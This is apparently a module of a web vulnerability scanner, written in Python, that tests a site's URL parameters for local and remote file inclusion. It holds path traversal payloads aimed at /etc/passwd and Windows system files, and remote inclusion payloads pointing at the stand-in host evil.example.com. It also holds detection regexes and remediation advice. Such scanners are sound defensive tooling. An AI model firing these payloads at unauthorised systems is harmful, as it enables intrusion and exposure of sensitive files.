from core.base import VulnCheck
from urllib.parse import urlparse, parse_qs, quote, urljoin
from colorama import Fore
import re

class LFI_RFIDetection(VulnCheck):
    def run(self):
        print(Fore.MAGENTA + "[*] Running module: " + self.__class__.__name__)
        print(Fore.CYAN + "\n[+] Checking for Local/Remote File Inclusion (LFI/RFI)...")
        
        lfi_payloads = [
            "../../../../../../etc/passwd",
            "../../../../../../etc/hosts",
            "../../../../../../windows/win.ini",
            "../../../../../../windows/system.ini",
            "/etc/passwd",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "....//....//....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        rfi_payloads = [
            "http://evil.example.com/malicious.txt",
            "https://evil.example.com/malicious.txt",
            "//evil.example.com/malicious.txt"
        ]
        
        lfi_patterns = [
            re.compile(r"root:[x*]:0:0:", re.IGNORECASE),
            re.compile(r"\[(boot|extension)\]", re.IGNORECASE),
            re.compile(r"Microsoft (R) Windows (R)", re.IGNORECASE)
        ]
        
        try:
            response = self.scanner.session.get(self.scanner.base_url, verify=False, timeout=15)
            parsed = urlparse(response.url)
            query_params = parse_qs(parsed.query)
            
            if not query_params:
                print(Fore.BLUE + "[i] No query parameters found to test")
                return
                
            # Check for LFI vulnerabilities
            for param in query_params:
                original_value = query_params[param][0]
                
                for payload in lfi_payloads:
                    try:
                        test_url = response.url.replace(
                            f"{param}={original_value}",
                            f"{param}={quote(payload)}"
                        )
                        
                        res = self.scanner.session.get(test_url, verify=False, timeout=10)
                        
                        for pattern in lfi_patterns:
                            if pattern.search(res.text):
                                snippet = res.text[:150].replace("\n", " ").strip()
                                self.scanner.vulnerabilities.append({
                                    'type': 'Local File Inclusion (LFI)',
                                    'location': f"URL Parameter: {param}",
                                    'example': f"Payload: {payload} → Response snippet: {snippet}",
                                    'severity': 'Critical',
                                    'solution': 'Validate and sanitize all file path inputs, use whitelists for allowed files, and avoid dynamic file inclusion',
                                    'references': ['CWE-22', 'OWASP-A1']
                                })
                                print(Fore.RED + f"[!] LFI vulnerability detected in parameter: {param}")
                                return
                                
                    except Exception as e:
                        print(Fore.YELLOW + f"[?] Error testing LFI payload {payload} on {param}: {str(e)}")
            
            # Check for RFI vulnerabilities
            for param in query_params:
                original_value = query_params[param][0]
                
                for payload in rfi_payloads:
                    try:
                        test_url = response.url.replace(
                            f"{param}={original_value}",
                            f"{param}={quote(payload)}"
                        )
                        
                        res = self.scanner.session.get(test_url, verify=False, timeout=10)
                        
                        if "evil.example.com" in res.text or payload.split('//')[1].split('/')[0] in res.text:
                            snippet = res.text[:150].replace("\n", " ").strip()
                            self.scanner.vulnerabilities.append({
                                'type': 'Remote File Inclusion (RFI)',
                                'location': f"URL Parameter: {param}",
                                'example': f"Payload: {payload} → Response snippet: {snippet}",
                                'severity': 'Critical',
                                'solution': 'Disable remote file inclusion functionality, validate all inputs, and use whitelists for allowed resources',
                                'references': ['CWE-98', 'OWASP-A1']
                            })
                            print(Fore.RED + f"[!] RFI vulnerability detected in parameter: {param}")
                            return
                            
                    except Exception as e:
                        print(Fore.YELLOW + f"[?] Error testing RFI payload {payload} on {param}: {str(e)}")
            
            print(Fore.GREEN + "[+] No obvious LFI/RFI vulnerabilities detected")
            
        except Exception as e:
            print(Fore.YELLOW + f"[?] Error during LFI/RFI check: {str(e)}")
            self.scanner.errors.append({
                'module': self.__class__.__name__,
                'error': str(e)
            })